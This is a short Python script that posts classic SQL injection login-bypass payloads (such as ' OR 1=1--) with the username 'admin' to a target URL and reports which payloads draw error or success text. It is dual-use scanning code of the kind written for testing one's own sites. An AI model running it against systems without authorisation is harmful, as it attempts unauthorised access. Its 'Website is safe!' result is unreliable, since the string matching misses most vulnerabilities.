import requests

def sqlscanner(target_url, username_field = "username", password_field = "password"):

    payloads = [
        "' OR '1'='1",
        "' OR 'a'='a",
        "' OR 1=1--",
        "' OR 1=1#"
    ]

    vulnerable_payloads = []

    for payload in payloads:
        data = {username_field: 'admin', password_field: payload}

        try:
            response = requests.post(target_url, data=data)
            
            if "error" in response.text.lower() or "sql" in response.text.lower() or "Login successful" in response.text:
                vulnerable_payloads.append(payload)
        
        except requests.RequestException:
            print(f"Request failed for payload: {payload}")
            continue
    
    if vulnerable_payloads == []:
        return 200, "Website is safe!"
    else:
        return 202, vulnerable_payloads